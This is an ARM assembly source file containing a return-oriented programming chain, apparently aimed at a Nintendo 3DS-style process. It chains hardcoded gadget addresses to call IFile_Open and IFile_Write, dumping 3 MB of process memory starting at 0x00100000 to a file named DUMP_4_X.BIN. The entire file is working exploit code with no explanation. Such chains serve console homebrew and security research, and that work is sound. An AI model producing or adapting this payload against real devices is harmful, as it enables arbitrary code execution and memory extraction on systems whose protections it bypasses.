	.arm
	.text

#define DUMPSTART 	0x00100000
#define DUMPSIZE	0x00300000

	.global	_start
@---------------------------------------------------------------------------------
_start:
	.word 0x00143d8c		@ ldmfd sp!, {r0,pc}
		.word FILE		@ (r0) - _this
	.word 0x001c4fc4		@ ldmfd sp!, {r1,pc}
		.word FileName		@ (r1) - path
	.word 0x0022952d		@ pop {r2,pc}
		.word 0x00000006	@ (r2) - openflags
	.word 0x001b82ac		@ IFile_Open(): r0=_this r1=UTF16 path r2=openflags, ends with ldmfd sp!, {r4-r8,pc}
		.word 0xdeadbeef	@ (r4)
		.word 0xdeadbeef	@ (r5)
		.word 0xdeadbeef	@ (r6)
		.word 0xdeadbeef	@ (r7)
		.word 0xdeadbeef	@ (r8)
	.word 0x00143d8c		@ ldmfd sp!, {r0,pc}
		.word FILE		@ (r0) - _this
	.word 0x001c4fc4		@ ldmfd sp!, {r1,pc}
		.word FILE + 32		@ (r1) - &writtenbytes
	.word 0x0022952d		@ pop {r2,pc}
		.word DUMPSTART		@ (r2) - src
	.word 0x0010538c		@ ldmfd sp!, {r3,pc}
		.word DUMPSIZE		@ (r3) - size
	.word 0x001b3b54		@ IFile_Write(_this, &writtenbytes, src, size) ends with ldmfd sp!, {r4-r11,pc}

FileName:
	
	.byte 'Y', 0, 'S' ,0, ':', 0, '/', 0, 'D', 0, 'U', 0, 'M', 0, 'P', 0, '_', 0, '4', 0, '_', 0, 'X', 0, '.', 0, 'B', 0, 'I', 0, 'N', 0, 0, 0

	.balign 32
FILE:	.fill	256, 1, 0
